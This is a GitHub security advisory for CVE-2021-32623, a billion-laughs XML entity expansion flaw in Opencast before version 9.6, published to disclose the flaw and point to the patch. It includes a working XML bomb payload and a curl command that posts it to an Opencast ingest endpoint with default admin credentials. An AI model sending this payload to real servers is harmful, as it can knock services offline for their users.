# [H] Billion laughs attack (XML bomb)

## Summary
Severity: High
Advisory: GHSA-9gwx-9cwp-5c2m
CVE: CVE-2021-32623
CWE: CWE-776
Ecosystem: Maven
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H (CVSS_V3)
Published: 2021-06-17
Source: https://github.com/advisories/GHSA-9gwx-9cwp-5c2m
Type: github-advisory

## Affected
- Maven: `org.opencastproject:opencast-kernel` — affected >=0 <9.6

## Details
### Impact

Opencast is vulnerable to the [Billion laughs attack](https://en.wikipedia.org/wiki/Billion_laughs_attack)  which allows an attacker to easily execute a (seemingly permanent) denial of service attack, essentially taking down Opencast using a single HTTP request.

Consider an XML file (`createMediaPackage.xml`) like this:

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE lolz [
 <!ENTITY lol "Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum. ">
 <!ELEMENT title (#PCDATA)>
 <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
 <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
 <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
 <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
 <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
]>
<mediapackage xmlns="http://mediapackage.opencastproject.org" id="d162d5b2-b54f-4400-a268-ee6565b0e6e7" start="2020-01-23T23:08:37Z">
  <title>&lol5;</title>
  <media/>
  <metadata/>
  <attachments/>
  <publications/>
</mediapackage>
```

Throwing this at Opencast will cause Opencast to parse the XML and expand the Lorem Ipsum about 100 000 times, instantly consuming a huge amount of memory:

```sh
curl -i -u admin:opencast https://develop.opencast.org/ingestdownload/ingestdownload \
  -F 'mediapackage=<createMediaPackage.xml' \
  -F sourceFlavors="" \
  -F sourceTags="" \
  -F deleteExternal="" \
  -F tagsAndFlavor='' \
  -o out.xml
```

Additional notes:

- You can likely use other endpoints accepting XML (this was just the first one I tried) and depending on how much memory you want to consume, you might want to enlarge the lorem ipsum text.
- Opencast's XML parser does limit the expansion to 100 000 times, already limiting the attack. Nevertheless, this can already harm the system. 
- To exploit this, users need to have ingest privileges, limiting the group of potential attackers

### Patches

The problem has been fixed in Opencast 9.6. Older versions of Opencast are not patched sue to the extent of this patch.

### Workarounds

There is no known workaround for this issue.

### References

- [Billion laughs attack explained](https://en.wikipedia.org/wiki/Billion_laughs_attack)
- For technical details, take a look at the patch fixing the issue: https://github.com/opencast/opencast/commit/_________

### For more information

If you have any questions or comments about this advisory:

- Open an issue in [our issue tracker](https://github.com/opencast/opencast/issues)
- Email us at [security@opencast.org](mailto:security@opencast.org)

## References
- https://github.com/opencast/opencast/security/advisories/GHSA-9gwx-9cwp-5c2m
- https://nvd.nist.gov/vuln/detail/CVE-2021-32623
- https://github.com/opencast/opencast/commit/16b0d641713fe31b8518fcf14fc5e4e815d81206
- https://github.com/opencast/opencast/commit/8ae27da5a6f658011a5741b3210e715b0dc6213e
- https://github.com/opencast/opencast
